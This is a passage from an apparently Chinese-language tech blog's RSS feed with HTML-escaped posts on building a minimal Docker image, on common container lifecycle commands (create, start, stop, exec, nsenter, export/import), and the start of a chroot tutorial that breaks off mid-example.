&lt;p&gt;为了压缩镜像体积，这里空白镜像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scratch&lt;/code&gt;作为基础镜像，并且镜像中只拷贝了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;say&lt;/code&gt;可执行文件。（当然，生产环境下不可能如此精简。）&lt;/p&gt;

&lt;p&gt;然后执行构建命令。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker build &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; say &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行完毕后，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker images&lt;/code&gt;可以看到&lt;strong&gt;REPOSITORY&lt;/strong&gt;为&lt;strong&gt;say&lt;/strong&gt;的镜像文件，其大小仅为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;923kB&lt;/code&gt;。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker images
REPOSITORY               TAG       IMAGE ID       CREATED         SIZE
say                      latest    aa5bb1e797b5   8 seconds ago   923kB
busybox                  latest    cabb9f684f8b   8 days ago      1.24MB
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后，从&lt;strong&gt;say&lt;/strong&gt;镜像启动一个容器来验证是否成功。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ docker run &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; say-c say
hello
say:hello
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从上可知，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;say&lt;/code&gt;在容器内正常执行。&lt;/p&gt;
</description>
        <pubDate>Wed, 04 May 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/05/04/docker-build-image/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/05/04/docker-build-image/</guid>
        
        <category>docker</category>
        
        <category>docker image</category>
        
        <category>docker build</category>
        
        <category>Dockerfile</category>
        
        
      </item>
    
      <item>
        <title>Docker container常用命令</title>
        <description>&lt;h1 id=&quot;docker-container常用命令&quot;&gt;Docker container常用命令&lt;/h1&gt;

&lt;h2 id=&quot;1-docker-container状态图&quot;&gt;1 docker container状态图&lt;/h2&gt;
&lt;center&gt;
    &lt;img style=&quot;border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);&quot; src=&quot;/img/resources/docker-container-state.svg&quot; width=&quot;75%&quot; alt=&quot;&quot; /&gt;
    &lt;br /&gt;
    &lt;div style=&quot;color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;&quot;&gt;
      图1 docker容器状态变化
  	&lt;/div&gt;
&lt;/center&gt;

&lt;h2 id=&quot;2-命令详解&quot;&gt;2 命令详解&lt;/h2&gt;

&lt;h3 id=&quot;21-容器启动&quot;&gt;2.1 容器启动&lt;/h3&gt;

&lt;p&gt;首先创建容器，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker create &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;busybox busybox
2dad99a1a04cd4adccfad768ac19389acbba4362090087fec8f587d5b9874abd
docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS    PORTS     NAMES
2dad99a1a04c   busybox   &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;      5 seconds ago   Created             busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;docker容器处于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Created&lt;/code&gt;状态，并未运行。&lt;/p&gt;

&lt;p&gt;然后，执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker start&lt;/code&gt;启动容器。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker start busybox
busybox
docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS         PORTS     NAMES
2dad99a1a04c   busybox   &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;      2 minutes ago   Up 3 seconds             busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在，容器处于运行状态。&lt;/p&gt;

&lt;p&gt;这个过程可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run&lt;/code&gt;简化过程。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker run &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; busybox busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Docker后台启动流程为：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Docker检查本地是否存在busybox镜像，如果镜像不存在则从Docker Hub拉取镜像。&lt;/li&gt;
  &lt;li&gt;使用busybox镜像创建并启动一个容器。&lt;/li&gt;
  &lt;li&gt;分配文件系统，并且在镜像只读层外创建一个读写层。&lt;/li&gt;
  &lt;li&gt;从Docker IP池中分配一个IP给容器。&lt;/li&gt;
  &lt;li&gt;执行用户启动命令运行镜像。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上述命令中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-t&lt;/code&gt;参数作用是分配一个伪终端，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-i&lt;/code&gt;参数表示打开&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDIN&lt;/code&gt;，因此&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-it&lt;/code&gt;表示进入交互模式。在交互模式下可以输入命令，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
PID   USER     TIME  COMMAND
    1 root      0:00 sh
    8 root      0:00 ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PID&lt;/code&gt;为1的进程&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt;。在交互模式下执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit&lt;/code&gt;，意味着杀死了1号进程，等同于容器被杀死。&lt;strong&gt;杀死容器主进程，则容器也会被杀死&lt;/strong&gt;。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;/ &lt;span class=&quot;c&quot;&gt;# ps -a&lt;/span&gt;
PID   USER     TIME  COMMAND
    1 root      0:00 sh
    8 root      0:00 ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
/ &lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS                     PORTS     NAMES
e27bbc62b96c   busybox   &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;      3 minutes ago   Exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 4 seconds ago             busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;22-终止容器&quot;&gt;2.2 终止容器&lt;/h3&gt;

&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker stop&lt;/code&gt;命令终止容器。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker stop &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;

Usage:  docker stop &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OPTIONS] CONTAINER &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;CONTAINER...]

Stop one or more running containers

Options:
  &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;--time&lt;/span&gt; int   Seconds to &lt;span class=&quot;nb&quot;&gt;wait &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;stop before killing it &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default 10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;改命令首先向运行中的容器发送&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGTERM&lt;/code&gt;信号，如果容器内1号进程接受并能处理，则等待1号进程处理完毕后退出；如果等待一段时间后，容器仍然没有退出，则会发送&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGKILL&lt;/code&gt;强制终止容器。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker stop busybox
busybox

docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
CONTAINER ID   IMAGE     COMMAND   CREATED          STATUS                       PORTS     NAMES
e27bbc62b96c   busybox   &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;      15 minutes ago   Exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;137&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 5 seconds ago             busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;23-进入容器&quot;&gt;2.3 进入容器&lt;/h3&gt;

&lt;p&gt;进入运行状态的容器可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker attach&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter&lt;/code&gt;等多种方式进入。&lt;/p&gt;

&lt;p&gt;（1）使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker attach&lt;/code&gt;进入容器&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c&quot;&gt;# tm1&lt;/span&gt;
docker attach busybox
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Hello&apos;&lt;/span&gt;
Hello

&lt;span class=&quot;c&quot;&gt;# tm2&lt;/span&gt;
docker attach busybox
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Hello&apos;&lt;/span&gt;
Hello
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker attach&lt;/code&gt;命令同时在多个终端运行时，所有的终端将会同步显示相同内容，当某个命令行窗口阻塞时，其它命令行窗口也将无法操作。&lt;/p&gt;

&lt;p&gt;（2）使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec&lt;/code&gt;进入容器&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; busybox /bin/sh
ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
PID   USER     TIME  COMMAND
    1 root      0:00 sh
    7 root      0:00 /bin/sh
   14 root      0:00 ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;进入容器后，可以看到容器内有两个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt;进程，7号进程是以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt;的方式进入容器启动的，每个命令窗口都是独立互不干扰的。&lt;/p&gt;

&lt;p&gt;（3）使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter&lt;/code&gt;进入容器&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://mozillazg.com/2020/04/nsenter-usage.html&quot;&gt;参考&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter&lt;/code&gt; 可以访问另一个进程的名称空间，并执行程序。&lt;/p&gt;

&lt;p&gt;首先获取容器的主进程&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PID&lt;/code&gt;，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker inspect &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\{\{&lt;/span&gt;.State.Pid&lt;span class=&quot;se&quot;&gt;\}\}&lt;/span&gt; busybox
11147
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取进程&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PID&lt;/code&gt;后，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsenter&lt;/code&gt;进入容器。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nsenter &lt;span class=&quot;nt&quot;&gt;--target&lt;/span&gt; 11147 &lt;span class=&quot;nt&quot;&gt;--mount&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--pid&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--uts&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--ipc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;
/bin/ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
PID   USER     TIME  COMMAND
    1 root      0:00 sh
   22 root      0:00 /bin/sh
   23 root      0:00 /bin/ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;或者，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nsenter &lt;span class=&quot;nt&quot;&gt;--target&lt;/span&gt; 11147 &lt;span class=&quot;nt&quot;&gt;--all&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;24-删除容器&quot;&gt;2.4 删除容器&lt;/h3&gt;

&lt;p&gt;删除停止状态的容器，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;强制删除运行中的容器，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;25-导出导入容器&quot;&gt;2.5 导出导入容器&lt;/h3&gt;

&lt;p&gt;（1）导出&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker export&lt;/code&gt;命令导出一个容器到文件，不管容器是否处于运行状态。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;busybox &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; busybox.tar
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;容器被打包进了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;busybox.tar&lt;/code&gt;文件。&lt;/p&gt;

&lt;p&gt;（2）导入&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker import&lt;/code&gt;命令可将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker export&lt;/code&gt;导出文件转化为本地镜像，最后使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run&lt;/code&gt;重新创建启动新的容器。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker import busybox.tar busybox:test
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Mon, 25 Apr 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/04/25/docker-container-command/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/04/25/docker-container-command/</guid>
        
        <category>State Machine</category>
        
        <category>Docker</category>
        
        <category>container</category>
        
        <category>nsenter</category>
        
        <category>docker import</category>
        
        <category>docker export</category>
        
        
      </item>
    
      <item>
        <title>chroot</title>
        <description>&lt;h1 id=&quot;chroot&quot;&gt;chroot&lt;/h1&gt;

&lt;h2 id=&quot;1-什么是chroot&quot;&gt;1 什么是chroot&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt;是在Unix和Linux系统的一个操作，针对正在运作的软件进程和子进程，改变其外显的根目录。由&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt;设置根目录的程序是不能够对这个指定根目录之外的文件进行访问、读取、更改。&lt;/p&gt;

&lt;h2 id=&quot;2-实例&quot;&gt;2 实例&lt;/h2&gt;

&lt;p&gt;这里，使用现成的busybox镜像来创建一个系统的基础文件目录，其中包含了一些常用的二进制文件。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c&quot;&gt;# 创建rootfs目录&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;rootfs

&lt;span class=&quot;c&quot;&gt;# 将busybox image的目录文件打包进压缩文件&lt;/span&gt;
